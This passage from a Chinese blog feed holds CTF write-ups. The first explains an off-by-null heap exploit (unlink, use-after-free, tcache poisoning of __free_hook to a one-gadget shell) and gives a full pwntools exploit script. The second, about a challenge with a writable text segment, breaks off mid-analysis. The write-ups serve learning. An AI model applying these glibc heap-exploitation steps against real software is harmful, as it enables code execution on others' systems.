      <url>//post/pwn-Off-by-Null.html</url>
      
        <content type="html"><![CDATA[<h1 id="Off-by-Null"><a href="#Off-by-Null" class="headerlink" title="Off_by_Null"></a>Off_by_Null</h1><h2 id="0x00-Pre"><a href="#0x00-Pre" class="headerlink" title="0x00 Pre"></a>0x00 Pre</h2><p>东北电力大学的一道pwn题，第一次遇到 Off_by_Null 类型的题目，顺便学习了一波unlink</p><span id="more"></span><h2 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size <span class="token operator">=</span> <span class="token function">read_8bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">6</span> <span class="token operator">&amp;&amp;</span> chunk_array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>      <span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> <span class="token number">7</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"List is Full!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">read_data</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>      chunk_array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">read_data</span><span class="token punctuation">(</span>__int64 ptr<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+13h] [rbp-Dh] BYREF</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Read error!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> <span class="token char">'\n'</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> ptr<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                      <span class="token comment">// null off by one</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个chunk的时候，往里面读入数据结尾会补0，null off by one 漏洞</p><h2 id="0x02-利用思路"><a href="#0x02-利用思路" class="headerlink" title="0x02 利用思路"></a>0x02 利用思路</h2><p>总体利用思路就是利用null字节溢出出发unlink构造UAF，然后第一次UAF泄露基地址，第二次构造tcache bin attack修改free hook为one gadget。</p><p>为了null字节溢出修改inuse位，第一个chunk大小位0x*8以复用prev_size位，这里我们构造0x38：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二个chunk涉及到需要包含至少一个unsortedbin且不会被放在tcache的区块，故我们选取0x900这一大区快</p><p>同时应为上一次chunk的null字节溢出，会把这个chunk的size位由0x911变成0x900，为了满足unlink的检查，我们同时需要伪造下一个区块的prev_size位,由于区块0x911-&gt;0x900,减小了0x10个字节，故伪造的下一个区块的prev_size位就是改区块的最后0x10字节处</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x900</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x900</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x900</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># chunk 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再来一个和chunk1连在一起触发unlink的区块</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x900</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">)</span> <span class="token comment">#chunk 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后来一个区块隔离top chunk</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'leave_top_chunk'</span><span class="token punctuation">)</span> <span class="token comment">#chunk 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>基本的构造就是这样，下面开始利用chunk0的null字节溢出修改chunk1的inuse位</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment"># chunk 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样被free的chunk1 的size位就会 0x911-&gt;0x900</p><p>这样该程序就会判定chunk 1的下一个区块头为我们填入p64(0x900)的位置，即下一区块的prev_size位位0x900</p><p>接着在chunk1中切下来一块，使剩下的部分被放入unsorted bin</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着埋入两个指针</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">)</span> <span class="token comment">#chunk 4 (for main_arene)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">)</span> <span class="token comment">#chunk 5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>chunk 4为了获得main_arena以或者基地址</p><p>chunk 5为了构造tcache bin 以实现任意地址写</p><p>接下来就可以触发unlink了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># unlink</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>chunk2 被free之后更具unlink的判定机制，由于原0x900大小的chunk1下一个区块的位chunk2，chunk2 的prev_size位为0x900符合判定，则触发unlink，合并chunk1和chunk2产生一个大区块，且是被free状态，但是构造的chunk 4和chunk 5的指针仍然存在。</p><p>即UAF构造成功</p><p>更具埋下的指针，chunk 4位于chunk 1的0x500处，我们add一个0x500的指针，剩下的区块被放在unsorted bin中，但是chunk 4正好指向unsorted bin的chunk头，可以把fd指针show出来</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 1</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"4 : "</span><span class="token punctuation">)</span>main_arena_96 <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span>  main_arena_96 <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x3ebc40</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3ed8e8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就获得了free hook和libc base的地址</p><p>之后我们free在被unlink的大区块内容的chunk 5，使其进入tcache bin ，然后在通过add改大区块，修改chunk 5的fd指针指向free hook，改为one gadget，即可getshell</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#free(5)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xd00</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>main_arena_96<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>ogg <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4f432</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"one gadget: "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x4f432 execve("/bin/sh", rsp+0x40, environ)constraints:  [rsp+0x40] == NULL'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn6"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn6'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chioce</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your choice :\n"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    chioce<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: \n"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    chioce<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    chioce<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 0</span>add<span class="token punctuation">(</span><span class="token number">0x900</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x900</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x900</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># chunk 1</span>add<span class="token punctuation">(</span><span class="token number">0x900</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">)</span> <span class="token comment">#chunk 2</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'leave_top_chunk'</span><span class="token punctuation">)</span> <span class="token comment">#chunk 3</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment"># chunk 0</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 1</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">)</span> <span class="token comment">#chunk 4 (for main_arene)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">)</span> <span class="token comment">#chunk 5</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># unlink</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 1</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"4 : "</span><span class="token punctuation">)</span>main_arena_96 <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span>  main_arena_96 <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x3ebc40</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3ed8e8</span><span class="token keyword">print</span> <span class="token string">"&lt;main_arena+96>: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena_96<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libc_base: "</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"&lt;__free_hook>: "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Free chunk (unsortedbin) | PREV_INUSE   chunk[4]Addr: 0x55fcc1e437a0Size: 0xd11fd: 0x7f724d018ca0bk: 0x7f724d018ca0'''</span><span class="token comment">#free(5)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xd00</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>main_arena_96<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>ogg <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4f432</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"one gadget: "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x4f432 execve("/bin/sh", rsp+0x40, environ)constraints:  [rsp+0x40] == NULL'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-text段可改</title>
      <link href="//post/pwn-text%E6%AE%B5%E5%8F%AF%E6%94%B9.html"/>
      <url>//post/pwn-text%E6%AE%B5%E5%8F%AF%E6%94%B9.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-text段可改"><a href="#pwn-text段可改" class="headerlink" title="pwn-text段可改"></a>pwn-text段可改</h1><h2 id="0x00-Pre"><a href="#0x00-Pre" class="headerlink" title="0x00 Pre"></a>0x00 Pre</h2><p>记一次线下赛遇到的text段可改的奇奇怪怪的pwn题</p><span id="more"></span><h2 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h2><p>程序初始化时就遇到一个没见过的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">mprotect</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dword_8048000<span class="token punctuation">,</span> <span class="token number">0x8888u</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mprotect函数改变源程序    0x8048000到0x8048000+0x8888   的属性，参数为7表明 <strong>可读可写可执行</strong></p><p>在没有开启pie保护的前提下，表明<strong>原程序代码段可修改</strong></p><p>main函数主要内容：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">buf_1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>buf_2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try use a bullet to pwn this%s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf_1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf_1<span class="token punctuation">,</span> <span class="token number">5u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>buf_1 <span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"ou launch the bullet, and... What's your name?%c\n"</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p is too big...\n"</span><span class="token punctuation">,</span> buf_1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">*</span>buf_1 <span class="token operator">=</span> buf_2<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"OK,you launch the bullet, and... What's your name?%c\n"</span><span class="token punctuation">,</span> <span class="token function">SHIBYTE</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf_1<span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf_1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>(int)&quot;ou launch the bullet, and... What&#39;s your name?%c\n&quot;</code>为该字符串的地址，为：0x08048888</p><p>即在buf_1输入一个地址，该地址如果小于等于0x08048888，即把buf_2的内容写入该地址，同时把buf_1的内容作为puts的参数输出</p><p>其中buf_1和buf_2都在栈上，这里当时在做题时快结束了才注意到这题为32位程序，栈上为4个字节，故第一次read buf_1时可以溢出一个字节到栈下一个参数 buf_2, 使buf_2可控。</p><p><strong>即可以控制源程序从 0x8048000 到 0x08048888 的任意一个字节。</strong></p><h2 id="0x02-解题思路"><a href="#0x02-解题思路" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h2><p>做出这题还有点半蒙半猜的性质，还是赛后整理学习的时候整明白整个过程的</p><p>主要思路就是修改程序text段的一个字节，使最后调用puts改成调用system，然后输入buf_1为 /bin/sh 运行shell，修改puts为system就是利用栈上溢出一个字节个往地址中写 buf_1中的地址写一个字节buf_2。</p><p>具体看关键的汇编：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:08048774 ; 25:   read(0, &amp;buf_1, 0xAu);.text:08048774                 add     esp, 10h.text:08048777                 sub     esp, 4.text:0804877A                 push    0Ah             ; nbytes.text:0804877C                 lea     eax, [ebp+buf_1].text:0804877F                 push    eax             ; buf.text:08048780                 push    0               ; fd.text:08048782                 call    _read.text:08048787 ; 26:   puts((const char *)&amp;buf_1);.text:08048787                 add     esp, 10h.text:0804878A                 sub     esp, 0Ch.text:0804878D                 lea     eax, [ebp+buf_1].text:08048790                 push    eax             ; s.text:08048791                 call    _puts.text:08048796                 add     esp, 10h.text:08048799                 mov     eax, 0.text:0804879E                 mov     ecx, [ebp+var_C].text:080487A1                 xor     ecx, large gs:14h.text:080487A8                 jz      short loc_80487AF.text:080487AA                 call    ___stack_chk_fail.text:080487AF ; ---------------------------------------------------------------------------.text:080487AF ; 27:   return 0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即我们需要修该<code> .text:08048787 ; 26:   puts((const char 